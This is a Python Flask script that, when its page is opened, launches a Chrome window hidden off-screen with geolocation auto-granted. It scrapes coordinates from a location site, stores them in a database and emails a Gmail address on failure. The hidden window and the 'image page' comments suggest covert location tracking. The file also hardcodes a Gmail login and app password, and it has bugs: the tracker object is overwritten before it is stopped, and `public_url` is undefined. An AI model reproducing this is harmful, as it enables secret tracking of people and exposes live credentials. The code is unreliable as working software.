################# IMPORTING ALL IMPORTANT MODULES ###################

import smtplib,ssl
from flask_sqlalchemy import SQLAlchemy
from selenium import webdriver
from selenium.webdriver.chrome.service import Service
from selenium.webdriver.chrome.options import Options
from selenium.webdriver.common.by import By
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC
from webdriver_manager.chrome import ChromeDriverManager

from flask import *
import os
###############################################


LOC=[]
BASEDIR = os.path.abspath(os.path.dirname(__file__)) # Directory where data are stored

############### Initializing & Creating Modules ###########################
app = Flask(__name__)
app.config['SQLALCHEMY_DATABASE_URI'] = 'sqlite:///' + os.path.join(BASEDIR, 'database.db')
app.config['SQLALCHEMY_TRACK_MODIFICATIONS'] = False
db = SQLAlchemy(app)
################ Making Modules ##################
class Location(db.Model):
    id = db.Column(db.Integer, primary_key=True)
    lat = db.Column(db.Text())
    long=db.Column(db.Text())

    def __init__(self, lat,long):
        self.lat=lat
        self.long=long

################################################


class Tracker:
    def __init__(self):
        self.chrome_options = Options()

        # Allow third-party geolocation
        self.chrome_options.add_experimental_option("prefs", {
            "profile.default_content_setting_values.geolocation": 1
        })

        self.service = Service(ChromeDriverManager().install())
        self.browser = webdriver.Chrome(service=self.service, options=self.chrome_options)
        self.browser.get('https://google.com')  # Fixed the missing colon here
        # self.browser.minimize_window()
        self.browser.set_window_position(-10000, 0)
         # Move window off-screen

        WEBSITE = "https://whatmylocation.com/"
        self.browser.get(WEBSITE)

    def google_maps(self):
        global LOC
        # Wait until latitude element is visible
        WebDriverWait(self.browser, 10).until(
            EC.visibility_of_element_located((By.ID, 'latitude'))
        )

        lat = self.browser.find_element(By.ID, 'latitude').text
        long = self.browser.find_element(By.ID, 'longitude').text
        LOC.append(lat)
        LOC.append(long)
    def stop(self):
        self.browser.quit()
######################################################

class Mail:

    def __init__(self,message,location):
        self.useremail = 'niecktm2023@gmail.com'
        self.user_password = 'qdwd bsqb jgjp itrm'
        self.location=location
        self.message=message
        self.send_mail()

    def send_mail(self):


        content=ssl.create_default_context()

        with smtplib.SMTP_SSL("smtp.gmail.com",465,context=content)as server:
            server.login(user=self.useremail,password=self.user_password)
            server.sendmail(self.useremail,'dipesh2072magar@gmail.com',msg=f'{self.message}\n\n{self.location}')


################################################################
@app.route('/')
def index():
    global LOCATION
    try:
        new = Tracker()
        new.google_maps()
        lat=str(LOC[0])
        long=str(LOC[1])
        new=Location(lat,long)
        db.session.add(new)
        db.session.commit()
        new.stop()

    except:
        Mail(message='location Not Tracked',location='Not Traced')

    return redirect(url_for('send_mail')) # return to image page

######### Image page #####################
@app.route('/home')
def send_mail():
     # return render_template('index.html')
    return 'hi'

if __name__=="__main__":

    with app.app_context():
        db.create_all()
    print(public_url)
    app.run(debug=True)
